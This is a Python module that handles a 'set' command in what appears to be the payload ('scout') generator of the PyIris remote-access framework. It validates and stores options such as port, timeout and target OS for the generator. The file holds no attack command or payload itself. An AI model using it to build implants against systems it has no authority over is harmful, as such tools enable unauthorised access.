# WEB + COM
# done
import library.modules.config as config
config.main()
interface = config.interface
if interface == "GUI":
    from flask import jsonify


def main(command):
    try:
        option = command.split(' ')[1]
        value = command.split(' ', 2)[2]
        if option == "Port":
            try:
                value = int(value)
                if value <= 65535 and value >= 0:
                    config.scout_values[option][0] = str(value)
                else:
                    raise IndexError
            except:
                raise IndexError
        elif option == "Timeout":
            try:
                value = int(value)
                config.scout_values[option][0] = str(value)
            except:
                raise IndexError
        else:
            config.scout_values[option][0] = value
        if interface == "CUI":
            print(config.pos + 'Set "' + str(option) + '" to "' + str(value) + '"')
            if config.scout_values['Windows'][0] == 'True':
                config.generator_prompt = '\x1b[1m\x1b[37mPyIris (\x1b[0m\033[92m' + '\x1b[1m\x1b[32mGenerator\x1b[0m' + '\x1b[1m\x1b[37m@\x1b[0m\033[92m' + '\x1b[1m\x1b[32mWindows\x1b[0m' + '\x1b[1m\x1b[37m) > \x1b[0m'
            else:
                config.generator_prompt = '\x1b[1m\x1b[37mPyIris (\x1b[0m\033[92m' + '\x1b[1m\x1b[32mGenerator\x1b[0m' + '\x1b[1m\x1b[37m@\x1b[0m\033[92m' + '\x1b[1m\x1b[32mLinux\x1b[0m' + '\x1b[1m\x1b[37m) > \x1b[0m'
        elif interface == "GUI":
            config.app.logger.info("[library/commands/generator_interface/set] - Set '" + str(option) + "' to '" + str(value) + "'")
            return jsonify({"output": "Success", "output_message": "", "data": config.scout_values})
    except (IndexError, KeyError) as e:
        if interface == "GUI":
            config.app.logger.error("[library/commands/generator_interface/set] - Error: " + str(e))
            return jsonify({"output": "Fail", "output_message": "Invalid command", "data": ""})
        elif interface == "CUI":
            print(config.neg + 'Please specify a valid option and value')

